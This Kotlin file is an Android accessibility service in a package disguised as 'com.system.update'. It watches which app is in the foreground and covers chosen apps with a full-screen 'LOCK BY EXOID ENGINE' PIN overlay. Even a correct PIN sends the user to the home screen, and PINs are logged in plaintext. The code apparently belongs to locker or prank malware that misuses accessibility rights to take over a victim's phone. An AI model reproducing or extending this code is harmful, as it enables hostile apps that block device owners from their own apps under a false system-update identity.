package com.system.update

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView

class AppLockAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AppLockSvc"
        private const val PREFS = "exoid_app_lock"
        var instance: AppLockAccessibilityService? = null

        fun setLockedApp(ctx: Context, pkg: String, pin: String) {
            val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            prefs.edit().putString(pkg, pin).apply()
            Log.i(TAG, "Locked: $pkg with pin=$pin")
        }

        fun unlockApp(ctx: Context, pkg: String) {
            val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            prefs.edit().remove(pkg).apply()
            Log.i(TAG, "Unlocked: $pkg")
        }

        fun isLocked(ctx: Context, pkg: String): Boolean {
            val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            return prefs.getString(pkg, null) != null
        }

        fun getPin(ctx: Context, pkg: String): String? {
            val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            return prefs.getString(pkg, null)
        }
    }

    private lateinit var prefs: SharedPreferences
    private lateinit var wm: WindowManager
    private var currentOverlay: View? = null
    private var currentPkg: String? = null
    private var unlockedTemp = mutableSetOf<String>()
    private var pollHandler: Handler? = null
    private var lastForegroundPkg: String? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        Log.i(TAG, "Service connected")
        startPolling()
    }

    private fun startPolling() {
        pollHandler?.removeCallbacksAndMessages(null)
        pollHandler = Handler(Looper.getMainLooper())
        pollHandler?.postDelayed(object : Runnable {
            override fun run() {
                try {
                    checkForegroundApp()
                } catch (e: Exception) {
                    Log.e(TAG, "poll error", e)
                }
                if (pollHandler != null) {
                    pollHandler?.postDelayed(this, 500)
                }
            }
        }, 500)
    }

    private fun checkForegroundApp() {
        val root = rootInActiveWindow ?: return
        val pkg = root.packageName?.toString() ?: return
        if (pkg.isEmpty() || pkg == packageName) return
        if (pkg == lastForegroundPkg) return
        lastForegroundPkg = pkg

        Log.i(TAG, "Foreground: $pkg")

        val pin = prefs.getString(pkg, null)
        if (pin == null) {
            if (currentPkg != null && currentPkg != pkg) {
                hideOverlay()
            }
            return
        }

        if (unlockedTemp.contains(pkg)) return

        if (currentPkg != pkg || currentOverlay == null) {
            showLockOverlay(pkg, pin)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
                checkForegroundApp()
            }
        } catch (e: Exception) {
            Log.e(TAG, "event error", e)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Service interrupted")
    }

    private fun dp(value: Int): Int = TypedValue.applyDimension(
        TypedValue.COMPLEX_UNIT_DIP,
        value.toFloat(),
        resources.displayMetrics
    ).toInt()

    private fun showLockOverlay(pkg: String, correctPin: String) {
        try {
            hideOverlay()
            currentPkg = pkg

            val root = FrameLayout(this).apply {
                setBackgroundColor(Color.parseColor("#F00A0A0A"))
                isClickable = true
                isFocusable = true
            }

            val card = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setPadding(dp(20), dp(28), dp(20), dp(28))
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = 40f
                    setColor(Color.parseColor("#CC1A0000"))
                    setStroke(4, Color.parseColor("#00FF66"))
                }
            }

            val icon = TextView(this).apply {
                text = "\uD83D\uDD12"
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 56f)
                gravity = Gravity.CENTER
            }

            val title = TextView(this).apply {
                text = "LOCK BY EXOID ENGINE \uD83D\uDE39"
                setTextColor(Color.parseColor("#00FF66"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
                setTypeface(null, Typeface.BOLD)
                gravity = Gravity.CENTER
                letterSpacing = 0.15f
                setPadding(0, dp(10), 0, dp(4))
            }

            val sub = TextView(this).apply {
                text = "Masukkan 4 angka PIN"
                setTextColor(Color.parseColor("#9A9A9A"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
                gravity = Gravity.CENTER
                setPadding(0, 0, 0, dp(12))
            }

            val pkgName = TextView(this).apply {
                text = pkg
                setTextColor(Color.parseColor("#D4AF37"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
                gravity = Gravity.CENTER
                setPadding(0, 0, 0, dp(16))
            }

            val pinDisplay = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
            }

            val pinBoxes = mutableListOf<TextView>()
            for (i in 0 until 4) {
                val box = TextView(this).apply {
                    text = "_"
                    setTextColor(Color.parseColor("#00FF66"))
                    setTextSize(TypedValue.COMPLEX_UNIT_SP, 26f)
                    gravity = Gravity.CENTER
                    background = GradientDrawable().apply {
                        shape = GradientDrawable.RECTANGLE
                        cornerRadius = 12f
                        setColor(Color.parseColor("#CC1A0000"))
                        setStroke(2, Color.parseColor("#00FF66"))
                    }
                    setPadding(0, dp(10), 0, 0)
                }
                val lp = LinearLayout.LayoutParams(dp(44), dp(52))
                lp.setMargins(dp(4), 0, dp(4), 0)
                pinDisplay.addView(box, lp)
                pinBoxes.add(box)
            }

            val status = TextView(this).apply {
                text = ""
                setTextColor(Color.parseColor("#E60000"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
                gravity = Gravity.CENTER
                setPadding(0, dp(10), 0, dp(8))
            }

            val pinBuffer = StringBuilder()

            fun refreshBoxes() {
                for (i in 0 until 4) {
                    pinBoxes[i].text = if (i < pinBuffer.length) "\u25CF" else "_"
                }
            }

            fun trySubmit() {
                if (pinBuffer.length == 4) {
                    if (pinBuffer.toString() == correctPin) {
                        unlockedTemp.add(pkg)
                        hideOverlay()
                        try {
                            val intent = Intent(Intent.ACTION_MAIN)
                            intent.addCategory(Intent.CATEGORY_HOME)
                            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            startActivity(intent)
                        } catch (_: Exception) {}
                    } else {
                        status.text = "PIN SALAH"
                        pinBuffer.setLength(0)
                        root.postDelayed({
                            refreshBoxes()
                            status.text = ""
                        }, 600)
                    }
                }
            }

            val keypad = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
            }

            val btnSize = dp(50)
            val btnMargin = dp(4)

            fun makeKey(label: String, isDanger: Boolean, onClick: () -> Unit): TextView {
                return TextView(this).apply {
                    text = label
                    setTextColor(if (isDanger) Color.parseColor("#FF4444") else Color.parseColor("#00FF66"))
                    setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
                    setTypeface(null, Typeface.BOLD)
                    gravity = Gravity.CENTER
                    background = GradientDrawable().apply {
                        shape = GradientDrawable.RECTANGLE
                        cornerRadius = 14f
                        setColor(Color.parseColor(if (isDanger) "#CC2A0000" else "#CC0F1A0F"))
                        setStroke(2, Color.parseColor(if (isDanger) "#FF4444" else "#00FF66"))
                    }
                    isClickable = true
                    isFocusable = true
                    setOnClickListener { onClick() }
                }
            }

            fun addRow(numbers: List<String>) {
                val row = LinearLayout(this).apply {
                    orientation = LinearLayout.HORIZONTAL
                    gravity = Gravity.CENTER
                }
                for (n in numbers) {
                    val isDel = n == "DEL"
                    val label = if (isDel) "\u232B" else n
                    val key = makeKey(label, isDel) {
                        when (n) {
                            "DEL" -> {
                                if (pinBuffer.length > 0) {
                                    pinBuffer.setLength(pinBuffer.length - 1)
                                    refreshBoxes()
                                }
                            }
                            "OK" -> trySubmit()
                            else -> {
                                if (pinBuffer.length < 4) {
                                    pinBuffer.append(n)
                                    refreshBoxes()
                                    trySubmit()
                                }
                            }
                        }
                    }
                    val lp = LinearLayout.LayoutParams(btnSize, btnSize)
                    lp.setMargins(btnMargin, btnMargin, btnMargin, btnMargin)
                    row.addView(key, lp)
                }
                keypad.addView(row)
            }

            addRow(listOf("1", "2", "3"))
            addRow(listOf("4", "5", "6"))
            addRow(listOf("7", "8", "9"))
            addRow(listOf("DEL", "0", "OK"))

            card.addView(icon)
            card.addView(title)
            card.addView(sub)
            card.addView(pkgName)
            card.addView(pinDisplay)
            card.addView(status)
            card.addView(keypad)

            val lp = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(dp(20), 0, dp(20), 0)
                gravity = Gravity.CENTER
            }
            root.addView(card, lp)

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM,
                PixelFormat.TRANSLUCENT
            )

            wm.addView(root, params)
            currentOverlay = root
            Log.i(TAG, "Overlay shown for $pkg")
        } catch (e: Exception) {
            Log.e(TAG, "showOverlay error", e)
        }
    }

    private fun hideOverlay() {
        try { currentOverlay?.let { wm.removeView(it) } } catch (_: Exception) {}
        currentOverlay = null
        currentPkg = null
    }

    override fun onDestroy() {
        hideOverlay()
        pollHandler?.removeCallbacksAndMessages(null)
        pollHandler = null
        instance = null
        Log.i(TAG, "Service destroyed")
        super.onDestroy()
    }
}